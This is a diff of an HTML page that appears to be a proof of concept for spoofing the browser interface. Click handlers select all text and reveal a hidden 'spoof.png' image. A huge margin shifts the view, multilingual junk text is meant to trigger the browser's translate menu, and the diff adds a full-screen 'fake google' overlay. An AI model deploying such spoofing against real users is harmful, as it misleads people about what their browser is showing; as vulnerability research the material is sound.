@@ -2,27 +2,103 @@
 <html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
 
 <script>
+    let popupShown = false;
+    
     function rfsSelectAll() {
         document.execCommand("selectAll");
-      document.getElementById("spoof").style   = "display: block;";
-
+        document.getElementById("spoof").style = "display: block;";
     }
 
     function selectAllChildren() {
         document.getSelection().selectAllChildren(paragraph1);
+        if (!popupShown) {
+            showSimpleFakeGooglePopup();
+            popupShown = true;
+        }
+    }
+    
+
+    function showSimpleFakeGooglePopup() {
+        const overlay = document.createElement('div');
+        overlay.id = 'popupOverlay';
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        `;
+        
+
+        const text = document.createElement('div');
+        text.id = 'fakeGoogleText';
+        text.style.cssText = `
+            font-size: 72px;
+            font-weight: 900;
+            color: #333;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            font-family: 'Arial Black', sans-serif;
+            text-shadow: 3px 3px 0 #4285F4, 
+                         6px 6px 0 #EA4335, 
+                         9px 9px 0 #FBBC05;
+        `;
+        text.textContent = "fake google";
+        
+        const closeBtn = document.createElement('button');
+        closeBtn.textContent = "×";
+        closeBtn.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #333;
+            color: white;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
+            z-index: 10002;
+        `;
+        closeBtn.onclick = closePopup;
+        
+        overlay.appendChild(text);
+        document.body.appendChild(overlay);
+        document.body.appendChild(closeBtn);
+        
+        setTimeout(closePopup, 5000);
+    }
+    
+    function closePopup() {
+        const overlay = document.getElementById('popupOverlay');
+        const closeBtn = document.querySelector('button[style*="position: fixed"]');
+        if (overlay) overlay.remove();
+        if (closeBtn) closeBtn.remove();
+        popupShown = false;
     }
 </script>
 
 <body>
             <img id="spoof" style="display: none;" src="spoof.png"></img>
 
-    <img style="margin-top: 9999px;"></img>
+
+    <img style="margin-top: 99999px;"></img>
 
     <p id="paragraph1">
         <!-- Trigger Translate Menu -->
-        A[=
-        ?:TLv
-        S9y
+       [异常文本触发翻译菜单异常文本触发翻译菜单异常文本触发翻译菜单]
+            [テキスト翻訳をトリガーする異常なテキスト]
+            A[= ?:TLv S9y 
+            متن غریب برای فعال کردن منوی ترجمه در مرورگر
+            Текст для активации меню перевода в браузере
+            Texto extraño para activar el menú de traducción
         <!-- Trigger Translate Menu -->
     </p>
 </body>
